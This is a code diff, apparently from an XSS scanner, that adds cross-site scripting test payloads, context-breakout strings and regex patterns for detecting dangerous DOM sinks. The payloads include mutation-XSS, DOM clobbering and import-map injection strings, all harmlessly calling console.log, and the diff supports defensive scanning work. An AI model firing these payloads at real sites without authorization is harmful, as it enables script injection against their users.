@@ -28,6 +28,21 @@ const XSS_SCAN_PAYLOADS = [
   { name: 'h1 inject', value: '<h1>xss</h1>' },
   { name: 'a href js', value: '<a href="javascript:console.log(1)">click</a>' },
   { name: 'constructor', value: "''.constructor.constructor('console.log(1)')()" },
+  { name: 'mXSS-SVG', value: '<svg><style></style><img src=x onerror=console.log(1)>' },
+  {
+    name: 'mXSS-Math',
+    value: '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=console.log(1)>',
+  },
+  {
+    name: 'DOM-Clobber',
+    value: '<form id=x><input name=y></form><img src=x onerror=console.log(x.y)>',
+  },
+  { name: 'Template-Literal', value: '`;console.log(1)//`' },
+  {
+    name: 'Import-Mapping',
+    value:
+      '<script type="importmap">{"imports":{"x":"data:text/javascript,console.log(1)"}}</script><script>import"x"</script>',
+  },
 ];
 
 const CONTEXT_PAYLOADS = {
@@ -56,6 +71,14 @@ const CONTEXT_PAYLOADS = {
     '" onerror=console.log(1) ',
     '" onfocus=console.log(1) autofocus="',
     '" onmouseover=console.log(1) "',
+    '" onfocus=console.log(1) autofocus="',
+    "' onfocus=console.log(1) autofocus='",
+    '` onfocus=console.log(1) autofocus=`',
+  ],
+  'script-src': [
+    '";console.log(1)//',
+    "';console.log(1)//",
+    '</script><script>console.log(1)</script>',
   ],
   url: ['javascript:console.log(1)'],
   insertAdjacentHTML: [
@@ -141,6 +164,16 @@ const SINK_PATTERNS = [
     regex: /import\s*\(\s*(?:location|document\.URL|\+)/g,
     severity: 'high',
   },
+  {
+    context: 'dom',
+    regex: /\b(location|document\.location|window\.location)\s*[=+]/g,
+    severity: 'high',
+  },
+  { context: 'dom', regex: /\bdocument\.write(ln)?\s*\(/g, severity: 'high' },
+  { context: 'dom', regex: /\binnerHTML\s*[=+]/g, severity: 'medium' },
+  { context: 'dom', regex: /\boutertext\s*[=+]/g, severity: 'medium' },
+  { context: 'template', regex: /\{\{.*\}\}/g, severity: 'info' },
+  { context: 'csp', regex: /script-src[^;]*/g, severity: 'info' },
 ];
 
 const SANITIZER_PATTERNS = [
